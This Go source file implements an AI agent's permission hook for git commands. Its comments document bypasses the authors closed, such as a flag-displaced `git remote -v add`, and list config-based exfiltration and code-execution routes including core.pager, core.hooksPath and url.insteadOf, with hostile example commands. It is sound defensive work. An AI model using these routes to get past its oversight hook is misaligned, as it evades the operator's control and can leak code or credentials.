	// compound `git clean -fdx && echo done`. `{}` IS NOT AUTOMATIC when an Ask is
	// flipped to an Abstain: a LATER rule in the chain can re-approve the leaf. It holds
	// here for two independent reasons — `git` is absent from safecmds' approve lists
	// (`alwaysSafe` / `safeReadCmds` / `safeWriteCmds`) and appears only in
	// `hasSubcommands`, so no later rule approves a bare `git` leaf; and Abstain
	// outranks Approve in hookio.MostRestrictive (Approve < Abstain < Ask < Reject,
	// pg2-t4uyx), so the approving `echo done` sibling cannot green-light the compound.
	// Both are asserted at the BOUNDARY rather than merely observed once — see
	// TestGit_Clean_EmitsEmptyHookOutput here and the chain-level
	// TestIntegration_CleanEmitsEmptyHookOutput in the engine suite.
	//
	// TWO SPELLINGS ARE NOT `{}`, AND NEITHER IS THIS ARM'S DOING — measured 2026-08-12:
	//
	//   - `GIT_DIR=/other/.git git clean -fdx` measures `deny`, from the `gitdir` rule
	//     (module `git-directory`), whose Reject outranks this Abstain in the same fold.
	//     It fires on the LITERAL `.git/` path in the env value, not on the redirection:
	//     `GIT_DIR=/other git clean -fdx` and the `GIT_WORK_TREE=` form both measure
	//     `{}`. So it is a `.git`-write refusal that happens to be spelled on a `clean`,
	//     not a `clean` verdict, and this arm neither strengthens nor weakens it.
	//   - `git clean --help` measures `allow`, from safecmds: isHelpRequest keys on
	//     hasSubcommands["git"], so `<cmd> <subcmd> --help` is approved as a man-page
	//     read. It was Ask before this change and is the ONE `git clean` leaf a later
	//     rule approves. Correct — `--help` deletes nothing — but it is why the "no
	//     later rule approves a `git` leaf" claim above is scoped to a BARE leaf. `git
	//     clean -h` is NOT that form (isHelpRequest wants `--help`) and measures `{}`.
	if subcmd == "clean" {
		// `--help` IS CARVED OUT, and it is the one carve-out in this file's ADR 0044
		// conversion. The note above records that `git clean --help` is the single
		// `git clean` leaf a LATER rule approves (safecmds' isHelpRequest, as a man-page
		// read) and that it measures `allow` today. A refusal floors that Approve to
		// abstain, so refusing here would take a measured allow off a leaf that deletes
		// nothing — a regression, and one this rule has no reason to want. `git clean -h`
		// is not this form and keeps its refusal, exactly as it keeps its `{}` today.
		if cmdparse.HasLongFlagPrefix(rest, "help") {
			return hookio.NotApplicable()
		}
		return r.refuse("git: git clean irreversibly deletes untracked files; deferring to prompt")
	}
	return hookio.NotApplicable()
}

// remoteVerdict returns the verdict for a `git remote` — rest being the args AFTER
// the `remote` subcommand. Unlike pushVerdict it always answers, because every
// `git remote` is either a mutation (Reject) or an inspection (Approve).
//
// THE SUBCOMMAND IS LOCATED WITH cmdparse.FirstOperand, NOT rest[0], AND THAT IS
// THE WHOLE BUG THIS CLOSES (pg2-8imjo). `rest[0]` is the first TOKEN, so any
// leading flag displaced the subcommand out of remoteBlockedSubcommands and the
// arm fell through to the read-only Approve below. Measured on a binary built from
// main @ b497d6f6, 2026-07-30: `git remote -v add upstream
// https://example.invalid/x.git` answered `allow` — rest[0] was `-v`. Every
// mutating verb had this bypass in both flag spellings (`-v`, `--verbose`).
// FirstOperand skips leading flags and `=`-glued values, and DELIBERATELY does not
// skip SEPARATED values, which is exactly what this call site needs: its doc
// comment pins this very case (`["-v","add","upstream",url]` → `add`), because a
// value-skipping walk would consume `add` as -v's value and answer `upstream`.
// A regression here MUST NOT be fixed by reintroducing an index — re-read that
// helper's doc first.
//
// WHY REJECT AND NOT ASK. Operator ruling, 2026-07-30: a `git remote` mutation
// must be a hard Reject; the operator would rather run those by hand. The
// rationale is EXFILTRATION — a remote mutation silently redirects where pushes
// land, so `git remote set-url origin <attacker-url>` turns every later, entirely
// ordinary-looking `git push origin main` into a send to another host, with
// nothing at the push site to show for it. An Ask cannot implement that ruling
// twice over: it asks a person a question the ruling has already answered, and
// before this change the Ask covered only the BARE spelling while every
// flag-displaced spelling of the SAME mutation was approved outright — which
// teaches its own bypass, the pattern the force-push Rejects (pushVerdict) exist
// to stop. Reject leaves no approvable spelling.
//
// IT IS ALSO THE CONTROL pg2-abb65 MIRRORS. `git push` to a network URL is a
// Reject whose recorded reasoning is that it is the SAME exfiltration vector with
// fewer steps, and must therefore be at least as strict as the `git remote
// set-url` gate. An Ask here would invert that relationship — the fast door
// refused, the slow one prompted — so this Reject is what makes that sibling's
// reasoning true. The two MUST be changed together or not at all.
//
// WHAT WOULD JUSTIFY CHANGING IT: a new operator ruling. Needing one remote added
// is not one — the operator runs it by hand, which is the remedy the ruling names.
//
// FALSE-POSITIVE COST IS ZERO, measured 2026-07-30: the only in-tree callers of
// `git remote add` are a `pn` workspace smoke script and two pg-pr Go tests, all of
// which run the command INSIDE a test binary or a shell script, where the hook
// never sees the inner command. The Reject reaches only an agent typing `git
// remote …` as a Bash tool call, which is the intent.
//
// READ-ONLY `git remote` STAYS APPROVE: bare `git remote`, `-v`/`--verbose`,
// `show`, `get-url`. `prune` and `update` also stay approvable — see
// remoteBlockedSubcommands for why they are not mutations in the sense that
// matters here.
//
// TEXT VS PARSED: the test reads PARSED tokens (post-unquote
// cmdparse.ParsedCommand.Args) and the rule runs only when
// isGitExecutable(pc.Executable), so `git remote set-url …` quoted in a commit
// message or a `bd comment` body is TEXT and never matches. That is the pg2-5b901
// failure mode; do not reintroduce a strings.Contains over command text.
func (r *Rule) remoteVerdict(rest []string) hookio.RuleResult {
	remoteSub, _ := cmdparse.FirstOperand(rest)
	if remoteBlockedSubcommands[remoteSub] {
		return hookio.RuleResult{
			Decision: hookio.Reject,
			Reason: "git: mutating a remote is prohibited — `git remote " + remoteSub +
				"` changes where pushes land, an exfiltration vector, so it is refused rather than prompted (operator ruling 2026-07-30). " +
				"Every spelling is refused, including a flag-displaced one such as `git remote -v " + remoteSub +
				"`, so retrying with another will not work. Ask the operator to run it by hand",
			Module: r.Name(),
		}
	}
	return hookio.RuleResult{Decision: hookio.Approve, Reason: "read-only git remote", Module: r.Name()}
}

// configGateClass is the MECHANISM by which a gated `git config` key is
// dangerous. The verdict is derived from the CLASS rather than stored per key, so
// two keys that fail the same way cannot drift to different answers, and adding a
// key is a one-line decision about which mechanism it is.
type configGateClass int

const (
	// configSink — git EXECUTES the value, or a program found under the path it
	// names, during an ordinary git operation.
	configSink configGateClass = iota + 1
	// configInterlock — the value DISABLES a refusal git makes by default, so a
	// later command that looks unchanged stops refusing what it used to.
	configInterlock
	// configRedirect — the value REPOINTS a remote at another host, so a later,
	// entirely ordinary `git push origin main` sends elsewhere.
	configRedirect
)

// gatedConfigKeys is the `git config` key set whose WRITE is gated, keyed on
// `<section>.<name>` lowercased with any middle subsection dropped — the identity
// configKeyID computes, and the reason one entry covers both `http.sslVerify` and
// `http.https://host/.sslVerify`.
//
// THE SURVEY (pg2-szadj, 2026-07-30). Every key the bead enumerated was weighed by
// MECHANISM, and the verdict follows the mechanism:
//
//	KEY                        MECHANISM  VERDICT  RATIONALE
//	clean.requireForce         interlock  Ask      git's refusal to delete untracked files without an explicit force flag. `false` removes it, and nothing at the `git clean` site shows that it is gone, so this write is the only place the loss is visible. (When pg2-szadj weighed the key, `git clean` still ASKED and the write left THAT prompt unchanged — the operator answering under a belief already falsified was the defect it named. pg2-u0e0c has since moved the `clean` arm to a uniform Abstain, which retires the misleading prompt; it does NOT retire this gate.)
//	core.hooksPath             sink       Ask      points hook execution at a caller-chosen directory: arbitrary code on the NEXT git operation, whatever that operation is.
//	core.pager                 sink       Ask      git spawns the value on nearly every read command; it is the same sink the pre-subcommand `-c core.pager=…` guard already defers.
//	core.fsmonitor             sink       Ask      the value MAY be a hook program git runs on every index refresh. Over-approximate: the harmless `true`/`false` spelling is gated too (see the OVER-APPROXIMATIONS note).
//	core.sshCommand            sink       Ask      replaces the ssh binary for every fetch and push.
//	diff.<driver>.textconv     sink       Ask      the enumerated `*.textconv`: git runs it to render a blob, selected by .gitattributes rather than by the command line.
//	diff.external              sink       Ask      replaces the diff program for every `git diff`.
//	receive.denyCurrentBranch  interlock  Ask      git's refusal to let a push update the branch checked out in a non-bare repo. `false`/`updateInstead` lets a push rewrite a live worktree's HEAD.
//	http.sslVerify             interlock  Ask      certificate verification for every https fetch/push. `false` makes an interception invisible.
//	url.<base>.insteadOf       redirect   REJECT   rewrites every matching URL, so `git push origin main` goes to another host with NO `git remote` change to show for it.
//
// NONE OF THE TEN IS LEFT APPROVED: each is either a program git executes or a
// refusal git makes, and the bead pre-authorized the ruling.
//
// WHY THE INTERLOCK AND SINK CLASSES ARE ASK, NOT REJECT — the weaker verdict is
// the CONSISTENT one. The identical vector by the other route, a pre-subcommand
// `git -c core.pager=EVIL log`, is already handled by hasGitConfigInjection as an
// ABSTAIN that defers to Claude's prompt. A decisive Ask is strictly stricter than
// that Abstain, so this gate sits at or above the control it mirrors, which is the
// relative-stringency test pushVerdict's network-URL Reject was argued from. Going
// further to Reject would make the porcelain route stricter than the injection
// route for the SAME sink, an inversion with no operator ruling behind it — and
// unlike force-push or `git remote`, no ruling exists here. An Ask is also what
// actually REPAIRS this defect: the harm is that the operator answers a later
// prompt under a stale belief, and a prompt AT THE MOMENT THE BELIEF CHANGES is
// exactly the remedy. Raising either class to Reject needs an operator ruling.
//
// WHY THE REDIRECT CLASS IS REJECT — relative stringency in the other direction.
// `git remote set-url` is a hard Reject (remoteVerdict, operator ruling
// 2026-07-30) precisely because it silently redirects where pushes land, and
// pushing straight to a URL is a Reject (pushVerdict) so that it cannot be the
// cheaper way around that gate. `git config remote.origin.url <url>` IS `git
// remote set-url`, by another porcelain and the same one config write; and
// `url.<base>.insteadOf` is strictly worse, since it leaves the remote's own URL
// looking correct. An Ask on any of them would reopen the door remoteVerdict
// closed. The three must be changed together with remoteVerdict or not at all.
//
// ANTI-BYPASS SIBLINGS ARE INCLUDED, because gating a key while the SAME mechanism
// stays reachable one word away teaches the bypass instead of closing it — the
// pattern remoteVerdict and pushVerdict were both written to stop:
//
//   - `pager.<cmd>` (whole section, see gatedConfigSections) — per-command pager;
//     `pager.log` is core.pager for one command.
//   - `core.editor`, `sequence.editor` — programs git spawns on commit/tag and on
//     `rebase -i`; core.pager's immediate siblings.
//   - `diff.<driver>.command`, `merge.<driver>.driver`,
//     `filter.<driver>.clean|smudge|process` — the rest of the .gitattributes
//     driver family that `diff.<driver>.textconv` belongs to; each runs a program
//     on checkout, add, diff or merge.
//   - `credential.helper` — a program git runs, and one handed credentials.
//   - `init.templateDir` — plants hooks into every repo a later `git init`/`git
//     clone` creates; core.hooksPath for repos that do not exist yet.
//   - `include.path`, `includeIf.<cond>.path` — makes git READ CONFIG from a
//     caller-chosen file, which can then set any key in this table. Gating the
//     table while leaving this open would make the whole table one indirection
//     deep.
//   - `url.<base>.pushInsteadOf` — the push-only twin of insteadOf.
//   - `remote.<name>.url`, `remote.<name>.pushurl` — the config spelling of `git
//     remote set-url`, which remoteVerdict already Rejects.
//
// ADDED AFTER THE SURVEY, EACH UNDER ITS OWN RULING. pg2-szadj's table above is a
// SNAPSHOT of what one bead enumerated in July 2026, not a closed set, so a key added
// later belongs here rather than edited into it — the survey's authority is over the keys
// it actually weighed:
//
//   - `core.askPass` (pg2-h1ori). MECHANISM sink, VERDICT Ask, same as every other
//     configSink. RATIONALE: git EXECUTES the value to obtain a credential — MEASURED on
//     git 2.54.0, 2026-08-13, `git credential fill` ran a marker script as the "Username
//     for …" prompt (scripts/probe-pg2-6c85x.sh). pg2-szadj never weighed it, so this is
//     an omission being closed rather than a ruling being reversed.
//
//     WHAT MADE IT WORTH ITS OWN BEAD: the asymmetry ran the wrong way round. Its ENV twin
//     `GIT_ASKPASS` has been screened since pg2-6c85x and the `-c` route screens it because
//     that route is key-blind, so the ONE unscreened spelling was the PERSISTENT one — the
//     porcelain write that outlives the command and applies to every later git operation
//     in the repo. Measured on main @ a064a73e, 2026-08-14: `git config core.askPass
//     /tmp/evil` and its `--global` and `--unset` forms each emitted `allow`.
//     TestGit_AskPass_ThreeSpellingsAreConsistent pins the three spellings as a relation,
//     and it is a relation rather than three literals because the porcelain gate is an Ask
//     while both injection routes are the weaker refusal — see "WHY THE INTERLOCK AND SINK
//     CLASSES ARE ASK" above for why that ordering is the correct one and not a drift.
//
//   - THE ALTERNATE-TRANSPORT FAMILY (pg2-qi1jo, 2026-08-14) — `core.gitProxy`,
//     `remote.<n>.uploadpack`, `remote.<n>.receivepack`, `uploadpack.packObjectsHook` as
//     SINKS, and `protocol.<n>.allow` as an INTERLOCK. This is the ONE RULING the
//     left-approved list below asked a later reader for, and it covers the whole bullet
//     rather than the one key that prompted it: settling half a family is what the
//     instruction existed to prevent.
//
//     THE RULING IS TO SCREEN, AND THE EVIDENCE IS MEASURED, NOT INFERRED. git 2.54.0,
//     2026-08-14, throwaway repos with `GIT_CONFIG_GLOBAL`/`GIT_CONFIG_SYSTEM` neutralised,
//     each key pointed at a marker script (scripts/probe-pg2-qi1jo.sh reproduces it):
//
//     KEY                          REACHES THE SINK?
//     core.gitProxy                YES — `ls-remote git://invalid.invalid/x.git` ran the marker as `invalid.invalid 9418`
//     remote.<n>.uploadpack        YES — `ls-remote <remote>` AND `fetch <remote>` ran it, argv `<repo path>`
//     remote.<n>.receivepack       YES — `push <remote> HEAD:refs/heads/x` ran it, argv `<bare repo path>`
//     uploadpack.packObjectsHook   YES, ONLY FROM GLOBAL/SYSTEM CONFIG — see the note below
//     protocol.<n>.allow           YES, AS THE UNLOCK — `ls-remote 'ext::<marker> %S'` ran the marker as `git-upload-pack` WITH `protocol.ext.allow=always`, and did NOT run it without
//
//     THE SURVEY'S "SERVER-SIDE" READING IS REFUTED FOR TWO OF THEM, which is why this
//     ruling screens rather than confirms the approval. `remote.<n>.uploadpack` and
//     `remote.<n>.receivepack` are run by the side that FETCHES and the side that PUSHES —
//     this machine — whenever the remote is a local path or file transport, which is the
//     everyday shape in this workspace (a `pn` workforest is a set of local clones with
//     local remotes). Neither needs a server to be an exec sink.
//
//     THE packObjectsHook READING IS THE ONE THAT NEEDED A SECOND INSTRUMENT, and the first
//     reading looked decisive and was not. Set in the SERVED REPO's own config the marker
//     did NOT run — git documents ignoring it at repository level "as a safety measure
//     against fetching from untrusted repositories" — so a first pass reads as "not a
//     sink". Re-measured with the key in GLOBAL config the marker RAN, argv `git
//     pack-objects --revs --thin --stdout --delta-base-offset`. GLOBAL is exactly what
//     `git config --global uploadpack.packObjectsHook …` writes, so the reachable spelling
//     IS the porcelain write this table gates, and gating the write is the control that
//     matters. A no-sink reading at one config LEVEL is not evidence about the KEY.
//
//     WHY NOT DECLINE THE FAMILY INSTEAD, which the bead left open as the other option.
//     Declining would have to decline `GIT_PROXY_COMMAND` too (pg2-6c85x measured it
//     reaching the same sink and declined it only pending this ruling), leaving a measured
//     exec sink open on both routes. Against that, the `git://` transport is
//     UNAUTHENTICATED AND UNENCRYPTED, so a repo reached over it is already untrusted and a
//     caller-named proxy program on that path carries no compensating trust to weigh — and
//     the prompt-volume cost of screening is ~ZERO, confirmed rather than assumed by
//     read-only replay over the 154-day ask log on 2026-08-14: NO row writes any of these
//     five keys, and every corpus occurrence of the spellings is a probe script or a bead
//     body. There is nothing on the other side of the scale.
//
// SURVEYED AND DELIBERATELY LEFT APPROVED:
//
//   - Ordinary configuration — `user.*`, `commit.gpgsign`, `branch.<n>.remote`,
//     `push.default`, `pull.rebase`, `core.autocrlf`, `color.*`, `fetch.prune`,
//     `init.defaultBranch`, `rerere.*` and the rest. None carries a mechanism, and
//     a blanket gate on `git config` WRITES is explicitly the wrong answer here: it
//     is a large false-positive surface over the routine traffic this rule exists
//     to keep flowing.
//   - `alias.<name>` — an alias whose value begins with `!` IS a shell command, but
//     it only runs when someone LATER invokes `git <alias>`, and at that point this
//     rule sees a git subcommand in no set and Abstains, deferring to the prompt.
//     So the sink is already prompted at use time; gating the definition as well
//     needs a ruling, not an inference.
//   - SETTLED, AND NO LONGER LEFT APPROVED — the alternate-transport family
//     (`remote.<n>.uploadpack`/`receivepack`, `uploadpack.packObjectsHook`,
//     `core.gitProxy`, `protocol.*.allow`). pg2-szadj left these approved as "genuine
//     sinks and loosenings, but on a server-side or alternate-transport path this
//     workflow does not use", and asked a later reader to add them UNDER ONE RULING
//     instead of rediscovering them. THAT RULING WAS MADE — pg2-qi1jo, 2026-08-14 — and
//     all five are now in the table above: four as configSink, `protocol.*.allow` as
//     configInterlock. The row is kept here, marked settled, rather than deleted, so a
//     reader who arrives via the old wording sees the outcome instead of re-opening the
//     question. THE "SERVER-SIDE" HALF OF THE ORIGINAL READING WAS WRONG for two of them
//     — see the family's entry under "ADDED AFTER THE SURVEY" for the measurements. MUST
//     NOT be re-listed as left-approved.
//   - `safe.directory`, `core.fileMode`, `core.symlinks` — they relax a check, but
//     execute nothing and redirect nothing.
//
// OVER-APPROXIMATIONS, all in the safe direction and all deliberate:
//
//  1. THE GATE DOES NOT MODEL THE DIRECTION OF THE CHANGE. `git config --unset
//     clean.requireForce` RESTORES the default and is harmless, yet it is gated.
//     Deciding direction means reading the key's VALUE, and configElideFlagValues
//     deliberately stops short of that: it knows which flags take an ARGUMENT, not
//     which operand is the value — that additionally requires knowing the
//     subcommand shape (`<key> <value>` vs `set <key> <value>` vs `--unset <key>`),
//     which is a second table for a verdict that would not change. The cost is one
//     prompt on a rare restore-to-default; the benefit is that no `--unset`-shaped
//     spelling is an approvable route to a gated key. Direction is not even
//     uniform: for a key whose safe state is SET, unsetting is the dangerous half.
//  2. `core.fsmonitor true` is gated although it names no program.
//  3. An operand that merely SPELLS a gated key is gated even in value position
//     (`git config alias.x diff.external`). Absurd input, and gating it is the safe
//     reading of an ambiguity that distinguishing key from value would be needed to
//     resolve — see 1.
var gatedConfigKeys = map[string]configGateClass{
	// Execution sinks — git runs the value, or something under it.
	"core.hookspath":    configSink,
	"core.pager":        configSink,
	"core.editor":       configSink,
	"sequence.editor":   configSink,
	"core.sshcommand":   configSink,
	"core.askpass":      configSink, // pg2-h1ori; the env twin GIT_ASKPASS was already screened
	"core.fsmonitor":    configSink,
	"diff.external":     configSink,
	"diff.textconv":     configSink, // diff.<driver>.textconv
	"diff.command":      configSink, // diff.<driver>.command
	"merge.driver":      configSink, // merge.<driver>.driver
	"filter.clean":      configSink, // filter.<driver>.clean
	"filter.smudge":     configSink, // filter.<driver>.smudge
	"filter.process":    configSink, // filter.<driver>.process
	"credential.helper": configSink, // also credential.<url>.helper
	"init.templatedir":  configSink,
	"include.path":      configSink,
	"includeif.path":    configSink, // includeIf.<condition>.path

	// The alternate-transport family's SINK half (pg2-qi1jo). Each MEASURED running a
	// marker on git 2.54.0 — see the family's entry in this table's doc for the argv each
	// was invoked with, and for why "server-side" was the wrong reading of the middle two.
	"core.gitproxy":              configSink, // `ls-remote git://…` ran it as `<host> 9418`
	"remote.uploadpack":          configSink, // remote.<n>.uploadpack — the FETCHING side runs it
	"remote.receivepack":         configSink, // remote.<n>.receivepack — the PUSHING side runs it
	"uploadpack.packobjectshook": configSink, // reachable from GLOBAL/SYSTEM config, which is what `--global` writes

	// Disabled safety interlocks — a refusal git makes by default.
	"clean.requireforce":        configInterlock,
	"http.sslverify":            configInterlock, // also http.<url>.sslVerify
	"receive.denycurrentbranch": configInterlock,
	// protocol.<n>.allow (pg2-qi1jo) — git REFUSES the `ext::` transport by default, and
	// `always` removes that refusal. MEASURED: `ls-remote 'ext::<marker> %S'` ran the
	// marker as `git-upload-pack` WITH the loosening and not without it, so this one key
	// is the difference between an inert URL and arbitrary command execution.
	"protocol.allow": configInterlock,

	// Silent redirects — where fetches and pushes actually go.
	"url.insteadof":     configRedirect, // url.<base>.insteadOf
	"url.pushinsteadof": configRedirect, // url.<base>.pushInsteadOf
	"remote.url":        configRedirect, // remote.<name>.url
	"remote.pushurl":    configRedirect, // remote.<name>.pushurl
}

// gatedConfigSections gates an ENTIRE section, for the one mechanism where every
// variable in the section is the same sink: `pager.<cmd>` sets the pager for one
// git command, so gating `core.pager` alone would leave `pager.log` as a one-word
// bypass of it.
var gatedConfigSections = map[string]configGateClass{
	"pager": configSink,
}

// Long-flag ABBREVIATION MINIMUMS for the `git config` options configVerdict keys
// on. Same mechanism as minAbbrevRepo, the one remaining `git push` minimum —
// git's parse-options accepts any UNAMBIGUOUS PREFIX, so matching one exact
// spelling misses real ones — but the minimums are NOT shared with it: what a prefix
// collides with depends on which option table git parsed the command against.
//
// THESE MINIMUMS MUST STAY MEASURED, and MUST NOT be replaced by
// cmdparse.HasLongFlagPrefix the way the `git push` boolean gates were (pg2-os1kq).
// A `git config` option match is not a bare dangerous-flag boolean: it ELIDES a
// token (configElideFlagValues) or flips the write indication, so it shifts the
// operand count that configIsRead's read/write bound and gatedConfigKey's key scan
// both rest on. Over-matching there has no safe direction — it could drop a real
// operand and change a `git config` verdict. See hasAbbrevLongFlag for the rule.
//
// Each value is the SHORTEST prefix real git accepted, MEASURED against git 2.54.0
// on 2026-07-30 by running the flag and reading back the config; one character
// shorter, git answered `error: ambiguous option`. Re-measure before changing one.
//
// ONLY WRITE-INDICATING options are listed, because those are the only spellings
// that can change an answer (see configIsRead). `--global`, `--local`, `--system`
// and `--type` need no entry: they are neither read nor write indicators, and the
// operand scan skips flags whatever they spell. Measured anyway, for a later
// reader: their minimums are `--gl`, `--lo`, `--sy` and `--t`, while `--g`, `--l`
// and `--s` are all ambiguous (`--g` with --get-color/--get-colorbool, `--l` with
// --local/--list, `--s` with --show-scope/--show-names).
const (
	minAbbrevUnset          = len("unset")  // exact only: `--unse` is ambiguous with --unset-all
	minAbbrevUnsetAll       = len("unset-") // one shorter is `--unset`, which IS a different option
	minAbbrevReplaceAll     = len("rep")    // `--re` is ambiguous: --rename-section / --remove-section
	minAbbrevAdd            = len("a")      // no other legacy `git config` option starts with a
	minAbbrevRemoveSection  = len("rem")    // `--re` as above
	minAbbrevRenameSection  = len("ren")    // `--re` as above
	minAbbrevConfigEditFlag = len("ed")     // `--e` is ambiguous: --edit / --expiry-date
)

// configWriteFlags maps each `git config` long option that MAKES THE INVOCATION A
// WRITE to its measured abbreviation minimum. Order of iteration does not matter —
// the caller only needs to know whether any is present.
var configWriteFlags = map[string]int{
	"unset":          minAbbrevUnset,
	"unset-all":      minAbbrevUnsetAll,
	"replace-all":    minAbbrevReplaceAll,
	"add":            minAbbrevAdd,
	"remove-section": minAbbrevRemoveSection,
	"rename-section": minAbbrevRenameSection,
	"edit":           minAbbrevConfigEditFlag,
}

// configValueFlags maps each `git config` long option that CONSUMES THE NEXT TOKEN
// as its argument to that option's measured abbreviation minimum, and
// configValueShortFlags is the same set's short spellings.
//
// MEASURED, not read off the usage text, against git 2.54.0 on 2026-07-30. The
// probe is decisive: with `foo.bar` set to a sentinel, `git config <flag> zzz
// foo.bar` prints the sentinel when <flag> CONSUMED `zzz` (so `foo.bar` is the key)
// and answers `error: key does not contain a section: zzz` when it did not. By that
// probe `--file`/`-f`, `--blob`, `--type`/`-t`, `--default`, `--comment`, `--value`
// and `--url` consume; `--fixed-value`, `--includes`, `--name-only`,
// `--show-origin`, `--regexp`, `--all`, `--bool`, `--int`, `--path`,
// `--expiry-date`, `-z` and `--null` do NOT. `--value` and `--url` are rejected as
// `unknown option` in the legacy positional mode and exist only under the git 2.54
// subcommands; they are listed because configElideFlagValues cannot tell the two
// modes apart and the entry is harmless in the mode that rejects the flag outright.
//
// THE MINIMUMS ARE ALSO GIT'S DISAMBIGUATION POINTS, which is why no BOOLEAN option
// can be mistaken for one of these: `--fil` because `--fi` is ambiguous with
// --fixed-value; `--bl` because `--b` is ambiguous with --bool-or-int/--bool-or-str;
// `--t`, `--d`, `--c`, `--v`, `--u` because no other option of that mode starts with
// those letters. Checked against every boolean listed above — none of their names
// prefix-matches an entry here at or above its minimum.
//
// GETTING AN ENTRY WRONG IS THE UNSAFE DIRECTION, so both halves of the list matter.
// A MISSING entry over-counts operands, which can only push an invocation INTO the
// gate (a false prompt). A SPURIOUS entry would elide a token that is really an
// operand, and could therefore drop the KEY out of the scan — which is why every
// entry above was measured rather than inferred, and why a new one MUST be.
var configValueFlags = map[string]int{
	"file":    len("fil"),
	"blob":    len("bl"),
	"type":    len("t"),
	"default": len("d"),
	"comment": len("c"),
	"value":   len("v"),
	"url":     len("u"),
}

// configValueShortFlags holds the EXACT short spellings that consume the next
// token. A CLUSTER is deliberately absent: `-zf cfg` does consume `cfg` (git hands
// -f the next argv when the cluster has nothing glued after the letter), but
// `-ft cfg` does NOT (there `t` is -f's glued value), and the two are
// indistinguishable without modelling every letter's arity. Leaving clusters out
// makes them over-count, which is the safe direction — see configValueFlags.
var configValueShortFlags = map[string]bool{"-f": true, "-t": true}

// configElidedValue replaces a separated flag ARGUMENT so the shared operand walk
// skips it. Any token beginning `--` is a flag to cmdparse.Operands, so the
// sentinel is invisible to both the operand count and the key scan.
const configElidedValue = "--elided-flag-value"

// configElideFlagValues returns args with the ARGUMENT of every separated
// value-taking flag replaced by configElidedValue, so that the operand walk sees
// only real operands.
//
// WHY IT IS NEEDED. cmdparse.Operands models no flag arity, so without this
// `git config -f /repo/.git/config --get core.fsmonitor` — a pure READ — presents
// two operands and reads as a write, which would gate it. With the elision it
// presents one and stays approvable.
//
// WHY IT CANNOT OPEN A HOLE. Elision removes only a token that git itself hands to
// a flag, so it reproduces git's own parse rather than second-guessing it — and this
// is what settles the one bypass shape it has to survive. Measured 2026-07-30:
// `git config --comment --get core.hooksPath /tmp/h` DOES perform the write, because
// git's parse-options gives `--comment` the next argv even though that argv looks
// like an option. Eliding `--get` there is therefore the CORRECT reading, and the
// two remaining operands still reach the gate. It also cannot swallow a write's key:
// a valid write names a key AND a value, and for elision to reach the key the flag
// would have to sit directly before it with no argument of its own, which is the
// spelling git rejects.
//
// Scanning STOPS at a `--` end-of-options terminator: after it no token is a flag,
// so none consumes a value.
func configElideFlagValues(args []string) []string {
	out := make([]string, len(args))
	copy(out, args)
	for i := 0; i+1 < len(out); i++ {
		if out[i] == "--" {
			return out // end of options; nothing after it is a flag value
		}
		if configValueShortFlags[out[i]] || configIsValueLongFlag(out[i]) {
			out[i+1] = configElidedValue
			i++ // the elided token cannot itself consume a value
		}
	}
	return out
}

// configIsValueLongFlag reports whether tok is a long spelling of a `git config`
// option that consumes the NEXT token — the full name or an unambiguous prefix down
// to its configValueFlags minimum.
//
// An `=`-glued token (`--type=bool`) is NOT one: its argument is part of the same
// token, so nothing follows to elide. A `--no-<name>` negation is not one either,
// since `no-file` does not prefix-match `file`.
func configIsValueLongFlag(tok string) bool {
	if !strings.HasPrefix(tok, "--") || strings.Contains(tok, "=") {
		return false
	}
	name := tok[2:]
	for full, minLen := range configValueFlags {
		if len(name) >= minLen && len(name) <= len(full) && full[:len(name)] == name {
			return true
		}
	}
	return false
}

// configWriteSubcommands is the git 2.54 SUBCOMMAND form of the same thing. git
// 2.54.0 grew `git config {list|get|set|unset|rename-section|remove-section|edit}`
// beside the legacy positional syntax (both measured working, 2026-07-30), and
// `git config set core.hooksPath /tmp/h` puts the key at the SECOND operand — a
// displacement a rule that only knew the legacy shape would walk straight past.
var configWriteSubcommands = map[string]bool{
	"set": true, "unset": true, "rename-section": true,
	"remove-section": true, "edit": true,
}

// configWriteIndicated reports whether a `git config` invocation is a WRITE on the
// evidence of an explicit option or subcommand alone, independent of how many
// operands it carries. It exists for the spellings configIsRead's operand bound
// cannot see: `--unset <key>` and `--unset-all <key>` name ONE operand, exactly
// like a bare read, and `--edit` names none.
func configWriteIndicated(args []string) bool {
	if sub, _ := cmdparse.FirstOperand(args); configWriteSubcommands[sub] {
		return true
	}
	for name, minLen := range configWriteFlags {
		if _, ok := hasAbbrevLongFlag(args, name, minLen); ok {
			return true
		}
	}
	// `-e` is git's short spelling of --edit. Tested by EXACT token rather than
	// with cmdparse.HasShortFlag because `git config`'s value-taking shorts are
	// `-f` and `-t`, and a glued value (`-fsome.env`) would contribute a stray `e`
	// to a cluster scan.
	return hasFlag(args, "-e")
}

// configIsRead reports whether a `git config` invocation only READS configuration.
// It is the read/write discrimination the gate needs in order to leave
// `git config --get user.email`, `git config --list` and the bare-key form
// `git config core.hooksPath` approvable while gating the writes.
//
// THE TEST IS AN OPERAND BOUND, NOT A FLAG ALLOWLIST, and that is what makes it
// safe. Reading one variable names AT MOST ONE OPERAND — the key — whether it is
// spelled `git config <key>`, `git config --get <key>` or `git config
// --get-regexp <pattern>`; the new-form `git config get <key>` names two, the
// subcommand plus the key. A WRITE always names one more (the value), so:
//
//   - `git config <key> <value>`, `git config --type=bool <key> <value>` and
//     `git config set <key> <value>` all exceed the bound and reach the gate,
//     whatever flags precede them. That is the FLAG-POSITION INDEPENDENCE the bead
//     requires: `--global`, `--local`, `--system` and `--type=bool` are flags, the
//     operand walk skips them, and the count is unchanged.
//   - A SEPARATED flag value (`-f <file>`, `--type bool`, `--comment <msg>`) would
//     otherwise be counted as an operand — cmdparse.Operands documents that it
//     models no arity — and could only push an invocation OUT of the read shape and
//     INTO the gate. So the bound is SOUND without any arity modelling; the
//     measured configElideFlagValues that runs first is a PRECISION layer over it,
//     removing the false prompt on reads such as `git config -f <file> --get
//     <gated-key>`. args reaching this function are already elided.
//
// The bound also closes the one displacement a `FirstOperand == "get"` test would
// have left open: for that token to be a separated flag VALUE rather than the
// new-form subcommand there must be a further operand for the key, and for a write
// a further one for the value, which puts the count past the bound. Measured
// 2026-07-30: git rejects the remaining shapes outright anyway — `git config
// --local get core.hooksPath` answers `error: key does not contain a section: get`,
// because the subcommand form only parses when the subcommand is the FIRST
// argument.
//
// WRITE INDICATORS ARE CHECKED FIRST because two write spellings sit INSIDE the
// bound: `--unset <key>` and `--unset-all <key>` name one operand and `--edit`
// names none. Without configWriteIndicated they would read as reads — and
// `--unset` is a spelling the bead requires be gated.
func configIsRead(args []string) bool {
	if configWriteIndicated(args) {
		return false
	}
	maxOperands := 1
